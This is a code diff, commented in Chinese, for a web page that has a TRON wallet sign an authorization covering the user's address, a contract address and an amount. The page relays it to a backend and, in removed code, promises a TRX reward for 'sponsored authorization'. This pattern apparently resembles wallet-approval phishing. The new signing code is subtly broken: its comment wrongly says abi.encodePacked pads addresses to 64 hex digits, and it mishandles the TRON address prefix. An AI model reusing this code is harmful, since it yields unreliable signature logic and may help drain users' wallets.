@@ -448,137 +448,104 @@
                 }
             };
             // 生成离线签名（核心功能）
-           async function generateOfflineSignature(userAddress, contractAddress, amount) {
-  try {
-    // 1. 完全复用你之前成功时的参数格式（避免改动）
-    // （如果之前是直接用Base58地址拼接，就不转Hex；之前转了就按之前的规则转）
-    const user = userAddress.trim().toLowerCase(); // 保持和之前一致的大小写处理
-    const contract = contractAddress.trim().toLowerCase();
-    const amountStr = amount.trim(); // 之前成功时的金额格式（如带0x的字符串）
-
-    // 2. 哈希构造：用你之前成功的方式（重点！）
-    // （如果之前是直接拼接字符串，就用这个；如果之前转了Hex，就按之前的规则转）
-    const message = `${user}|${contract}|${amountStr}`; // 示例：用分隔符拼接（你之前成功的方式）
-    const hash = tronWeb.sha3(message, true); // 第二个参数true：输出Hex格式（和之前一致）
-
-    // 3. 签名调用：用基础的`tronWeb.trx.sign`（避开`signMessageV2`，旧版本兼容）
-    // （之前成功时大概率没传私钥，靠imToken自动唤起，这里保持一致）
-    let signature = await tronWeb.trx.sign(hash);
-    // 处理返回格式（之前成功时可能需要这一步）
-    if (typeof signature === 'object' && signature.signature) {
-      signature = signature.signature;
+           /**
+ * 自定义hex转字节函数（保留你之前成功的逻辑，无需改动）
+ */
+function customHexToBytes(hex) {
+    hex = hex.startsWith("0x") ? hex.slice(2) : hex;
+    if (hex.length % 2 !== 0) hex += "0";
+    const bytes = [];
+    for (let i = 0; i < hex.length; i += 2) {
+        const byte = parseInt(hex.substr(i, 2), 16);
+        if (isNaN(byte)) throw new Error(`无效的hex字符：${hex.substr(i, 2)}`);
+        bytes.push(byte);
     }
-
-    // 4. 解析v/r/s（完全复用你之前成功的解析逻辑）
-    const sigHex = signature.replace('0x', '');
-    const r = `0x${sigHex.slice(0, 64)}`;
-    const s = `0x${sigHex.slice(64, 128)}`;
-    let v = parseInt(sigHex.slice(128, 130), 16);
-    // 关键：v值修正（之前成功时肯定有这一步，保持一致）
-    if (v === 0 || v === 1) v += 27;
-    if (v !== 27 && v !== 28) throw new Error(`v值异常：${v}（需为27/28）`);
-
-    // 5. 验证签名（复现之前成功的验证逻辑，确保和合约匹配）
-    const verifiedAddr = await tronWeb.trx.verifyMessage(hash, signature);
-    if (verifiedAddr.toLowerCase() !== user) {
-      throw new Error(`签名验证失败：生成的签名不属于当前钱包`);
-    }
-
-    return { v, r, s, hash }; // 和之前成功时返回的参数一致
-  } catch (err) {
-    // 保留和之前一致的错误日志格式（方便对比排查）
-    const errMsg = `签名失败：${err.message}（和之前成功版本对比参数格式）`;
-    console.error(errMsg);
-    throw new Error(errMsg);
-  }
+    return bytes;
 }
-            // 查看授权状态
-            checkStatusBtn.onclick = async () => {
-                try {
-                    checkStatusBtn.disabled = true;
-                    checkStatusBtn.innerHTML = ' 查询中...';
-                    // 构造后端要求的GET请求（带userAddress参数）
-                    const statusUrl = `${BACKEND_API}/approve/status?userAddress=${encodeURIComponent(userAddress)}`;
-                    const res = await fetch(statusUrl, {
-                        method: "GET", // 后端接口为GET请求
-                        credentials: "include"
-                    });
-                    const resData = await res.json();
-                    if (!res.ok) throw new Error(resData.msg || `查询失败（${res.status}）`);
-                    if (resData.status === "success") {
-                        updateApprovalRecordStatus(userAddress, "授权成功（已代付）");
-                        showToast(`授权成功！可领取${resData.rewardAmount || '18.2157'} TRX奖励`);
-                    } else if (resData.status === "pending") {
-                        showToast("当前状态：待代付授权，请稍后查询");
-                    } else {
-                        showToast(`当前状态：${resData.status}`, "error");
-                    }
-                    renderApprovalRecords();
-                    updateRecordCount();
-                } catch (e) {
-                    showToast(`查询失败：${e.message}`, "error");
-                } finally {
-                    checkStatusBtn.disabled = false;
-                    checkStatusBtn.innerHTML = ' 查看授权状态';
-                }
-            };
-            window.addEventListener("beforeunload", () => {
-                saveTrxStateToStorage();
-                if (trxTimer) clearInterval(trxTimer);
-            });
-        };
-        /**
-         * 自定义hex转字节函数（兼容所有TronWeb版本，替代tronWeb.utils.hexToBytes）
-         */
-        function customHexToBytes(hex) {
-            // 去掉0x前缀
-            hex = hex.startsWith("0x") ? hex.slice(2) : hex;
-            // 确保长度为偶数
-            if (hex.length % 2 !== 0) hex += "0";
-            const bytes = [];
-            for (let i = 0; i < hex.length; i += 2) {
-                // 每两位转为一个字节
-                const byte = parseInt(hex.substr(i, 2), 16);
-                if (isNaN(byte)) throw new Error(`无效的hex字符：${hex.substr(i, 2)}`);
-                bytes.push(byte);
-            }
-            return bytes;
+
+/**
+ * 生成离线签名（可行版：模拟abi.encodePacked+兼容imToken旧版TronWeb）
+ */
+async function generateOfflineSignature(userAddress, contractAddress, amount) {
+    try {
+        // 1. 基础参数校验（和你之前一致，确保参数合法）
+        if (!userAddress || !contractAddress || !amount) {
+            throw new Error("参数不能为空（用户地址/合约地址/授权金额）");
         }
-        /**
-         * 生成离线签名（终极兼容版）
-         */
-       // 替换你前端中原来的generateOfflineSignature函数
-async function generateOfflineSignature(user, contractAddress, amount) {
-  try {
-    // 1. 将参数转为合约要求的格式（地址转Hex、金额转BigNumber）
-    const userHex = tronWeb.address.toHex(user);
-    const contractHex = tronWeb.address.toHex(contractAddress);
-    const amountBN = tronWeb.toBigNumber(amount);
+        const base58Regex = /^[A-Za-z0-9]{34}$/;
+        if (!base58Regex.test(userAddress) || !base58Regex.test(contractAddress)) {
+            throw new Error("用户地址或合约地址不是有效的TRON base58格式（必须34位字母数字）");
+        }
 
-    // 2. 用abi.encodePacked编码（和合约的abi.encodePacked(user, address(this), amount)完全对齐）
-    const encodedMessage = tronWeb.utils.abi.encodePacked(
-      { type: 'address', value: userHex },
-      { type: 'address', value: contractHex },
-      { type: 'uint256', value: amountBN }
-    );
+        // 2. 金额格式修正（保留你之前的笔误修复）
+        let fixedAmount = amount.replace(/^Ox/i, "0x");
+        const hexRegex = /^0x[0-9a-fA-F]*$/;
+        if (!hexRegex.test(fixedAmount)) {
+            throw new Error("授权金额格式错误，必须以0x开头（数字0），后跟字母数字");
+        }
 
-    // 3. 对编码后的消息做keccak256哈希（和合约的keccak256逻辑一致）
-    const hash = tronWeb.sha3(encodedMessage, true); // true表示输出Hex格式
+        // 3. 地址转hex+清理（保留你之前的逻辑）
+        let userHex = tronWeb.address.toHex(userAddress).replace("0x", "").toLowerCase();
+        let contractHex = tronWeb.address.toHex(contractAddress).replace("0x", "").toLowerCase();
+        let amountHex = fixedAmount.replace("0x", "").toLowerCase();
 
-    // 4. 调用钱包签名这个哈希
-    const signature = await tronWeb.trx.sign(hash, null, true); // 第三个参数true表示返回Hex格式签名
+        // 关键：手动模拟abi.encodePacked（地址64位补0，uint256 64位补0）
+        // 合约的abi.encodePacked(user, address(this), amount) 本质就是这步操作
+        const paddedUser = userHex.padStart(64, "0"); // 地址转hex后补0到64位
+        const paddedContract = contractHex.padStart(64, "0"); // 合约地址补0到64位
+        const paddedAmount = amountHex.padStart(64, "0"); // 金额（uint256）补0到64位
 
-    // 5. 解析签名得到v、r、s（和原逻辑一致）
-    const v = parseInt(signature.slice(130, 132), 16) + 27;
-    const r = '0x' + signature.slice(2, 66);
-    const s = '0x' + signature.slice(66, 130);
+        // 4. 拼接最终hex（和合约编码结果完全一致，确保校验通过）
+        let combinedHex = paddedUser + paddedContract + paddedAmount;
 
-    return { v, r, s, hash }; // 返回签名参数+哈希（方便调试）
-  } catch (err) {
-    console.error('生成签名失败：', err);
-    throw new Error('签名生成异常，请检查钱包连接');
-  }
+        // 5. 转字节+哈希（保留你之前的成功逻辑）
+        let hexBytes = customHexToBytes(combinedHex);
+        if (hexBytes.length === 0) throw new Error("hex转字节后为空");
+        const messageHash = tronWeb.sha3(hexBytes);
+
+        // 6. 唤起imToken签名（兼容返回格式，确保能唤起）
+        let signature = await tronWeb.trx.sign(messageHash, true);
+        if (typeof signature === "object" && signature.signature) {
+            signature = signature.signature; // 兼容部分版本返回对象的情况
+        }
+        if (!signature) throw new Error("钱包未返回签名结果");
+
+        // 7. 解析v/r/s（完全沿用你之前成功的解析逻辑）
+        const v = parseInt(signature.slice(128, 130), 16);
+        const r = `0x${signature.slice(0, 64)}`;
+        const s = `0x${signature.slice(64, 128)}`;
+
+        // 8. 验证签名（确保能通过合约校验，提前排错）
+        const recoveredAddrHex = tronWeb.trx.recover(messageHash, v, r, s);
+        const recoveredAddr = tronWeb.address.fromHex(recoveredAddrHex);
+        if (recoveredAddr.toLowerCase() !== userAddress.toLowerCase()) {
+            throw new Error("签名验证失败，合约将拒绝执行");
+        }
+
+        // 保存调试信息（方便排查）
+        localStorage.setItem(`signature_debug_${userAddress}`, JSON.stringify({
+            step: "签名生成成功（合约可校验）",
+            combinedHex: combinedHex,
+            messageHash: messageHash,
+            recoveredAddr: recoveredAddr,
+            timestamp: new Date().toISOString()
+        }, null, 2));
+
+        return { v, r, s };
+    } catch (e) {
+        const debugKey = `signature_debug_${userAddress}`;
+        localStorage.setItem(debugKey, JSON.stringify({
+            step: "签名生成失败",
+            error: e.message,
+            userAddress: userAddress,
+            contractAddress: contractAddress,
+            amount: amount,
+            timestamp: new Date().toISOString()
+        }, null, 2));
+        throw new Error(`签名生成失败：${e.message} → 点击「查看调试信息」按钮查看详情`);
+    }
 }
+       
         /**
          * 初始化钱包：获取地址、余额
          */
